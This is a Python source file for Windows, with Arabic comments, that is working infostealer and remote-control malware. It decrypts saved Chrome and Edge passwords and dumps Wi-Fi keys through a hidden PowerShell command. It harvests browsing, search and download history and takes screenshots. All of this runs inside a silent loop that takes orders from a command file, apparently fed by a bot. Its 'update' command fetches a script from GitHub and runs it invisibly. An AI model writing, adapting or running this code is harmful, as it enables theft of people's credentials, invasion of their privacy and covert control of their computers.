import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab
import os
import requests
import subprocess
from pathlib import Path
import time
from datetime import datetime, timedelta

CREATE_NO_WINDOW = 0x08000000

# إعدادات القناة الثابتة
BASE_DIR = r"C:\ProgramData\MOS"
CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
RES_FILE = os.path.join(BASE_DIR, "res.txt")
SS_FILE = os.path.join(BASE_DIR, "ss.png")

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except: return None

def decrypt_password(buff, m_key):
    try:
        cipher = AES.new(m_key, AES.MODE_GCM, buff[3:15])
        return cipher.decrypt(buff[15:])[:-16].decode()
    except: return f"Hash: {base64.b64encode(buff).decode()}"

def run_passwords():
    out = ""
    user_p = os.path.expanduser('~')
    browsers = {"Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data", "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data"}
    for name, path in browsers.items():
        db, st = path + r"\Default\Login Data", path + r"\Local State"
        if os.path.exists(db):
            out += f"\n--- {name} Passwords ---\n"
            try:
                m_key = get_master_key(st)
                tmp = os.path.join(os.environ["TEMP"], "tmp_p.db")
                shutil.copyfile(db, tmp)
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cur.fetchall():
                    if row[1].strip():
                        out += f"🌐 Site: {row[0]}\n📧 User: {row[1]}\n🔑 Pass: {decrypt_password(row[2], m_key)}\n---\n"
                conn.close(); os.remove(tmp)
            except Exception as e: out += f"Err {name}: {e}\n"
    return out or "No Passwords Found."

def run_wifi():
    try:
        # هذا الأمر يجلب كل الشبكات وكلمات السر دفعة واحدة
        cmd = 'netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = $_.ToString().Split(":")[1].Trim(); $key = (netsh wlan show profile name=$name key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim(); "SSID: $name | Pass: $key" }'

        
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True,
            text=True,
            encoding="cp850",
            creationflags=CREATE_NO_WINDOW
        ).stdout
        return res if res.strip() else "No WiFi profiles found."
    except:
        return "⚠️ Error retrieving WiFi or No saved networks."

def run_history():
    out = ""
    user_p = os.path.expanduser('~')
    paths = {"Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History", "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History"}
    for b, p in paths.items():
        if os.path.exists(p):
            out += f"--- {b} History ---\n"
            tmp = os.path.join(os.environ["TEMP"], "h_tmp")
            shutil.copyfile(p, tmp)
            try:
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC LIMIT 15")
                for r in cur.fetchall(): out += f"🔹 {r[0][:50]}\n🔗 {r[1]}\n\n"
                conn.close(); os.remove(tmp)
            except: pass
    return out



# --- إعداد المسارات ---
CROSSMOS_PATH = Path(r"C:\ProgramData\MOS\crossmos.py")
CROSSMOS_URL  = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/crossmos.py"
PYTHON_EXEC   = Path(r"C:\ProgramData\MOS\python_platform.exe")

def update():
    try:
        # حذف CMD_FILE لتجنب التكرار
        if os.path.exists(CMD_FILE):
            os.remove(CMD_FILE)
        # 1️⃣ حذف الملف القديم إذا كان موجودًا
        if CROSSMOS_PATH.exists():
            CROSSMOS_PATH.unlink()
            print("[+] Deleted old crossmos.py")

        # 2️⃣ تحميل النسخة الجديدة
        r = requests.get(CROSSMOS_URL, timeout=30)
        if r.status_code != 200 or len(r.content) < 100:
            print("[!] Failed to download the new crossmos.py")
            return

        # كتابة الملف الجديد في المسار المناسب
        with open(CROSSMOS_PATH, "wb") as f:
            f.write(r.content)
        print("[+] Downloaded new crossmos.py successfully")

        # 3️⃣ تشغيل crossmos.py باستخدام python_platform.exe بصمت
        subprocess.Popen(
            [str(PYTHON_EXEC), str(CROSSMOS_PATH)],
            cwd=str(CROSSMOS_PATH.parent),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
        print("[+] crossmos.py launched successfully")

    except Exception as e:
        print(f"[!] Update failed: {e}")


import urllib.parse

def run_search_history():
    user_p = os.path.expanduser("~")
    paths = {
        "Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History",
    }
    
    # تحديد مسار الملف داخل مجلد البرنامج الأساسي
    output_file = os.path.join(BASE_DIR, "search_history.txt")
    SEARCH_KEYS = ["q", "search_query", "query"]
    results = []

    for browser, history_path in paths.items():
        if not os.path.exists(history_path):
            continue

        temp_copy = os.path.join(os.environ["TEMP"], f"{browser}_sh_tmp.db")
        try:
            shutil.copy2(history_path, temp_copy)
            conn = sqlite3.connect(temp_copy)
            cur = conn.cursor()

            # جلب الروابط التي تحتوي على علامة استفهام (روابط البحث غالباً)
            cur.execute("SELECT url, last_visit_time FROM urls WHERE url LIKE '%?%'")

            for url, last_visit in cur.fetchall():
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)

                for key in SEARCH_KEYS:
                    if key in params:
                        raw_query = params[key][0].strip()
                        if not raw_query: continue

                        # فك ترميز النصوص (مثل الكلمات العربية)
                        clean_query = urllib.parse.unquote_plus(raw_query)
                        
                        # تحويل التوقيت
                        time_dt = datetime(1601, 1, 1) + timedelta(microseconds=last_visit)
                        visit_time = time_dt.strftime("%Y-%m-%d %H:%M:%S")

                        results.append((visit_time, browser, clean_query, url))

            conn.close()
            os.remove(temp_copy)
        except:
            if os.path.exists(temp_copy): os.remove(temp_copy)
            continue

    if not results:
        return "NO_SEARCH_DATA"

    # ترتيب وإزالة التكرار
    results = list(dict.fromkeys(results))
    results.sort(key=lambda x: x[0])

    with open(output_file, "w", encoding="utf-8") as f:
        f.write("--- BROWSER SEARCH HISTORY REPORT ---\n\n")
        for time_s, br, query, url in results:
            f.write(f"Time: {time_s} | Browser: {br}\nSearch: {query}\nURL: {url}\n")
            f.write("-" * 60 + "\n")
    
    return "SEARCH_FILE_READY"

from datetime import datetime, timedelta

def run_downloads():
    user_p = os.path.expanduser("~")
    paths = {
        "Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History",
    }
    
    # مسار الملف النهائي الذي سيقوم البوت برفعه
    output_file = os.path.join(BASE_DIR, "downloads_report.txt")
    results = []

    for browser, history_path in paths.items():
        if not os.path.exists(history_path):
            continue

        temp_copy = os.path.join(os.environ["TEMP"], f"{browser}_dl_tmp.db")
        try:
            shutil.copy2(history_path, temp_copy)
            conn = sqlite3.connect(temp_copy)
            cur = conn.cursor()

            cur.execute("SELECT id, target_path, start_time FROM downloads")
            downloads = cur.fetchall()

            for download_id, target_path, start_time in downloads:
                cur.execute("SELECT url FROM downloads_url_chains WHERE id = ? ORDER BY chain_index LIMIT 1", (download_id,))
                row = cur.fetchone()
                if not row: continue
                
                url = row[0]
                # تحويل وقت كروم (Microseconds since 1601)
                time_dt = datetime(1601, 1, 1) + timedelta(microseconds=start_time)
                time_str = time_dt.strftime("%Y-%m-%d %H:%M:%S")
                results.append((time_str, browser, target_path, url))

            conn.close()
            os.remove(temp_copy)
        except:
            if os.path.exists(temp_copy): os.remove(temp_copy)
            continue

    if not results:
        return "NO_DATA"

    # ترتيب النتائج حسب الوقت
    results = list(dict.fromkeys(results))
    results.sort(key=lambda x: x[0])

    with open(output_file, "w", encoding="utf-8") as f:
        f.write("--- BROWSER DOWNLOAD HISTORY REPORT ---\n\n")
        for time_s, br, path, url in results:
            f.write(f"Date: {time_s}\nBrowser: {br}\nFile: {path}\nSource: {url}\n")
            f.write("-" * 50 + "\n")
    
    return "FILE_READY"

# حلقة المراقبة الصامتة
if not os.path.exists(BASE_DIR): os.makedirs(BASE_DIR)
while True:
    if os.path.exists(CMD_FILE):
        try:
            with open(CMD_FILE, "r") as f: cmd = f.read().strip()
            res = ""
            if cmd == "passwords": res = run_passwords()
            elif cmd == "wifi": res = run_wifi()
            elif cmd in ["history", "browser"]: res = run_history()
            elif cmd == "update": res = update()
            elif cmd == "screenshot":
                ImageGrab.grab().save(SS_FILE)
                res = "SCREENSHOT_DONE"
            elif cmd == "downloads":
                status = run_downloads()
                if status == "FILE_READY":
                    # نخبر البوت أن الملف جاهز في المسار المعتاد
                    res = "DOWNLOADS_READY"
                else:
                    res = "No downloads found or error occurred."

            # --- كود الحذف بعد التأكيد (يُضاف في نهاية معالجة الأوامر) ---
            # يمكنك إضافة أمر جديد يرسله البوت باسم 'cleanup_dl' بعد أن ينتهي من تحميل الملف
            elif cmd == "clear_dl":
                dl_file = os.path.join(BASE_DIR, "downloads_report.txt")
                if os.path.exists(dl_file):
                    os.remove(dl_file)
                res = "CLEANUP_DONE"
            
            elif cmd == "searchs":
                status = run_search_history()
                if status == "SEARCH_FILE_READY":
                    # يرسل للبوت إشارة بأن الملف جاهز للرفع من المسار BASE_DIR
                    res = "SEARCH_HISTORY_READY"
                else:
                    res = "No search history found."

            # أمر إضافي لحذف ملفات البحث بعد أن يسحبها البوت
            elif cmd == "clear_searchs":
                search_file = os.path.join(BASE_DIR, "search_history.txt")
                if os.path.exists(search_file):
                    os.remove(search_file)
                res = "SEARCH_CLEANUP_DONE"


            with open(RES_FILE, "w", encoding="utf-8") as f: f.write(res)
            os.remove(CMD_FILE) # مسح الطلب بعد التنفيذ
        except: pass
    time.sleep(1)
